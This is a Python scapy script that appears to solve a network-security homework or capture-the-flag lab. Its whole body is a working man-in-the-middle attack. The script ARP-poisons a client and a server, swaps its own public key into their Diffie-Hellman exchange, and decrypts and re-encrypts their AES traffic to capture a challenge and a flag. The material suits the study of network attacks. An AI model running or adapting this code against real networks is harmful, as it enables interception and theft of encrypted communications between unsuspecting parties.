

from scapy.all import *
import sys
import time
import hashlib
from threading import Thread
import ast
import random
import string
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from Crypto import Random
#from scapy.layers.inet import IP, TCP
#from scapy.layers.l2 import *


interface = "nshw3-mitm-pc"
clientIP = "192.168.0.2"
serverIP = "192.168.0.1"
clientMAC = ""
serverMAC = ""
serverPrime = 0
serverGenerator = ''
serverPublicKey = ''
getServerData = False
getClientData = False
clientPublicKey = ''
symKeyForClient = ''
symKeyForServer = ''
clientDecryptedMessages = []
serverDecryptedMessages = []

def create_PubKey(generator,privateKey,prime,keyLength):
    prePubKey = str(pow(int(generator), int(privateKey), int(prime)))
    return '0'* (keyLength - len(prePubKey)) + prePubKey

def create_SymKey(myPriKey, hisPubKey, prime,keyLength):
    preSymKey = str(pow(int(hisPubKey), int(myPriKey), int(prime)))
    return '0' * (keyLength - len(preSymKey)) + preSymKey

def get_key(dh_key):
    dh_key = int(dh_key)
    shared_secret_bytes = dh_key.to_bytes(dh_key.bit_length() // 8 + 1, byteorder="big")
    s = hashlib.sha256()
    s.update(bytes(shared_secret_bytes))
    return s.digest()

def aes_encrypt(string, key) :
    aeskey = hashlib.md5(key).hexdigest()
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(aeskey, AES.MODE_CBC, iv)
    return b64encode(iv + cipher.encrypt(string))


def aes_decrypt(string, key):
    string = b64decode(string)
    aeskey = hashlib.md5(key).hexdigest()
    iv = string[:AES.block_size]
    cipher = AES.new(aeskey, AES.MODE_CBC, iv)
    return cipher.decrypt(string[AES.block_size:])




def get_mac(IP):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff") / ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd, rcv in ans:
       return rcv.sprintf(r"%Ether.src%")


def ARP_Poisoning():
    while True:
        send(ARP(op=2, psrc=serverIP, pdst=clientIP, hwdst=clientMAC))
        send(ARP(op=2, psrc=clientIP, pdst=serverIP, hwdst=serverMAC))
        time.sleep(1)



def modified_callback(packet):
    global serverPrime
    global serverGenerator
    global serverPublicKey
    global getServerData
    global getClientData
    global clientPublicKey
    global symKeyForClient
    global symKeyForServer
    global clientDecryptedMessages
    global serverDecryptedMessages
    global attackerPublicKey
    global attackerPrivateKey
    global attackerPrime
    f = False
    if packet[Ether].src == clientMAC or packet[Ether].src == serverMAC:
        packet[Ether].src = packet[Ether].dst
        if packet[IP].dst == clientIP :
            packet[Ether].dst = clientMAC
        elif packet[IP].dst == serverIP :
            packet[Ether].dst = serverMAC
        del (packet[IP].chksum)
        del(packet[TCP].chksum)
        data = packet[TCP].payload
        string = str(data)[2:-1]
        if 'dh-keyexchange' in string and 'generator' in string:

            dic = ast.literal_eval(string)
            getServerData = True
            serverPrime = dic['dh-keyexchange']['prime']
            serverGenerator = dic['dh-keyexchange']['generator']
            serverPublicKey = dic['dh-keyexchange']['publicKey']
            attackerPrime = serverPrime
            attackerGenerator = serverGenerator
            attackerPrivateKey = str(int(attackerPrime) - 3)
            attackerPublicKey = create_PubKey(attackerGenerator, attackerPrivateKey, attackerPrime, len(attackerPrime))
            symKeyForServer = get_key(create_SymKey(attackerPrivateKey,serverPublicKey,serverPrime,len(serverPublicKey)))

            # send client your public-Key instead of server
            pre_payload_dic = {'generator':attackerGenerator,'prime':attackerPrime,'publicKey':attackerPublicKey}
            payload_dic = {'dh-keyexchange': pre_payload_dic}
            payload_str = str(payload_dic).replace(" {","{").replace(", ",",").replace("\'","\"")
            payload_byteArray = payload_str.encode('utf-8')
            packet[TCP].payload = ''.encode('utf-8')
            packet[TCP].payload = payload_byteArray

        elif 'dh-keyexchange' in string:
            getClientData = True
            dic = ast.literal_eval(string)
            clientPublicKey = dic['dh-keyexchange']['publicKey']
            #send Server your public-Key instead of client
            pre_payload_dic = {'publicKey': attackerPublicKey}
            payload_dic = {'dh-keyexchange': pre_payload_dic}
            payload_str = str(payload_dic).replace(" {", "{").replace(", ", ",").replace("\'", "\"")
            payload_byteArray = payload_str.encode('utf-8')
            packet[TCP].payload = payload_byteArray
            symKeyForClient = get_key(create_SymKey(attackerPrivateKey, clientPublicKey, attackerPrime, len(serverPublicKey)))

        elif len(string) > 10 :
            if packet[IP].src == clientIP :
                #packet from client; decrypt with client key then encrypted with server key and send to him
                decMessage = aes_decrypt(string,symKeyForClient)
                print("Client Solution for Server Challenge")
                print(decMessage)
                clientDecryptedMessages.append(decMessage)
                packet[TCP].payload = aes_encrypt(decMessage,symKeyForServer)

            elif packet[IP].src == serverIP:
                # packet from server decrypt with server key then encrypted with client key and send to him
                decMessage = aes_decrypt(string, symKeyForServer)

                if not f:
                    print("Server challenge for the Client: ")
                    print(decMessage)
                    f = True
                else:
                    print("Flag is: ")
                    print(decMessage)
                serverDecryptedMessages.append(decMessage)
                encMessage = aes_encrypt(decMessage, symKeyForClient)
                packet[TCP].payload = encMessage
        sendp(packet, iface="nshw3-mitm-pc")




def mitm():
    global clientMAC
    global serverMAC
    clientMAC = get_mac(clientIP)
    serverMAC = get_mac(serverIP)
    thread = Thread(target=ARP_Poisoning)
    thread.start()
    sniff(iface="nshw3-mitm-pc", filter="tcp", prn=modified_callback, store=0)


mitm()

